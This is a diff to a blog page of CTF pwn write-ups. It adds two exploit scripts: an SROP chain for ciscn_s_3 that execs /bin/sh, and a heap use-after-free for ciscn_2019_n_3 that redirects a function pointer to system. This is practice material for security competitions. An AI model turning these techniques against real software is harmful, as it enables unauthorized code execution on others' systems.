@@ -26,7 +26,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ciscn-s-3"><span class="toc-text">0x08:ciscn_s_3</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ciscn-s-3"><span class="toc-text">0x08:ciscn_s_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-ciscn-2019-n-3"><span class="toc-text">0x09:ciscn_2019_n_3</span></a></li></ol></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -326,7 +326,62 @@ p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-str
 <h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2><pre><code class="hljs python">payload = <span class="hljs-string">"\x11"</span> * <span class="hljs-number">0x35</span>
 p.sendline(payload)</code></pre>
 
-<h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2>
+<h2 id="0x08-ciscn-s-3">0x08:ciscn_s_3<a class="post-anchor" href="#0x08-ciscn-s-3"></a></h2><p>SROP</p>
+<pre><code class="hljs python">rt_sigreturn = <span class="hljs-number">0x4004DA</span>      <span class="hljs-comment">#mov rax 15;ret</span>
+read_write_ret = <span class="hljs-number">0x4004F1</span>    <span class="hljs-comment">#sys_read;sys_write;ret</span>
+syscall = <span class="hljs-number">0x400517</span>           <span class="hljs-comment">#syscall;ret</span>
+payload = <span class="hljs-string">'/bin/sh\x00'</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">"a"</span>) + p64(read_write_ret)
+gdb.attach(p)
+raw_input(<span class="hljs-string">"#"</span>)
+p.send(payload)
+p.recv(<span class="hljs-number">32</span>)
+binsh_addr = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x118</span>
+p.recv(<span class="hljs-number">8</span>)
+frame = SigreturnFrame()
+frame.rax = constants.SYS_execve
+frame.rdi = binsh_addr
+frame.rsi = <span class="hljs-number">0</span>
+frame.rdx = <span class="hljs-number">0</span>
+frame.rsp = binsh_addr
+frame.rip = syscall
+raw_input(<span class="hljs-string">'#'</span>)
+payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(rt_sigreturn)+p64(syscall)+str(frame)
+p.send(payload)</code></pre>
+
+<h2 id="0x09-ciscn-2019-n-3">0x09:ciscn_2019_n_3<a class="post-anchor" href="#0x09-ciscn-2019-n-3"></a></h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span><span class="hljs-params">(idx,typer,length,content)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">1</span>))
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(typer))
+	<span class="hljs-keyword">if</span> typer == <span class="hljs-number">1</span>:
+		p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(content))
+	<span class="hljs-keyword">else</span>:
+		p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(length))
+		p.recvuntil(<span class="hljs-string">"&gt; "</span>)
+		<span class="hljs-keyword">if</span> len(content) == length<span class="hljs-number">-1</span>:
+			p.send(content)
+		<span class="hljs-keyword">else</span>:
+			p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">2</span>))
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(<span class="hljs-number">3</span>))
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,str(idx))
+
+new(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>)
+new(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"a"</span>)
+new(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0</span>)
+free(<span class="hljs-number">1</span>)
+free(<span class="hljs-number">2</span>)
+new(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-string">'bash'</span>+p32(elf.plt[<span class="hljs-string">'system'</span>]))
+new(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">"/bin/sh\x00"</span>)
+free(<span class="hljs-number">1</span>)
+gdb.attach(p)
+p.interactive()</code></pre>
+
+
 
   
     <div class="post-reward">
@@ -351,6 +406,8 @@ p.sendline(payload)</code></pre>
   
   <div class="post-guide">
     <div class="item left">
+        
+          <a href="/2019/12/24/第四季CTF答题赛write-up/">第四季CTF答题赛write up</a>
         
     </div>
     <div class="item right">
